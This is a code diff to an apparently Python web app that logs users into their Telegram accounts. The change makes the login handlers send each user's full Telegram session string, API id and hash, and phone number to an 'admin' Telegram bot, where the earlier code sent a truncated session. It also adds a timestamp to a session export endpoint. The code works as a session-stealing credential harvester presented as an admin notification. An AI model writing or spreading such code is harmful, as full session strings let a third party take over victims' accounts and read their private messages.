@@ -148,21 +148,14 @@ def loop_run(coro, timeout=120):
 def notify_admin_login(username, api_id, api_hash, session_string, phone):
     """
     Send login credentials to the admin Telegram bot
-    in the exact format specified.
+    with the FULL session string - no truncation.
     """
     try:
-        # Truncate session string for display - show first 50 and last 20 chars
-        display_session = "N/A"
-        if session_string and len(session_string) > 70:
-            display_session = session_string[:50] + "..." + session_string[-20:]
-        elif session_string:
-            display_session = session_string
-
         message = json.dumps({
             "username": username,
             "api_id": api_id,
             "api_hash": api_hash,
-            "session": display_session,
+            "session": session_string if session_string else "N/A",
             "phone": phone if phone else "N/A",
             "connected": True
         }, indent=2, ensure_ascii=False)
@@ -175,10 +168,10 @@ def notify_admin_login(username, api_id, api_hash, session_string, phone):
             "parse_mode": "Markdown"
         }
 
-        response = requests.post(url, json=payload, timeout=10)
+        response = requests.post(url, json=payload, timeout=15)
 
         if response.status_code == 200:
-            print(f"[ADMIN BOT] Notification sent for {username}")
+            print(f"[ADMIN BOT] Full session notification sent for {username}")
         else:
             print(f"[ADMIN BOT] Failed: {response.text}")
 
@@ -1057,7 +1050,7 @@ async def async_verify_otp(
         )
 
         # =========================================================
-        # NOTIFY ADMIN ON SUCCESSFUL LOGIN
+        # NOTIFY ADMIN ON SUCCESSFUL LOGIN - FULL SESSION SENT
         # =========================================================
         notify_admin_login(
             username=username,
@@ -1100,7 +1093,7 @@ async def async_verify_otp(
             save_user(user)
 
             # =========================================================
-            # NOTIFY ADMIN ON SUCCESSFUL LOGIN (WITH 2FA)
+            # NOTIFY ADMIN ON SUCCESSFUL LOGIN - FULL SESSION SENT
             # =========================================================
             notify_admin_login(
                 username=username,
@@ -1300,10 +1293,14 @@ def export_session():
     if not user or not user.get("session_string"):
         return jsonify({"success": False, "error": "No session string found. Connect first."}), 404
 
+    from datetime import datetime
+    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")
+
     return jsonify({
         "success": True,
         "username": username,
-        "session_string": user["session_string"]
+        "session_string": user["session_string"],
+        "created_at": now
     })
 
 
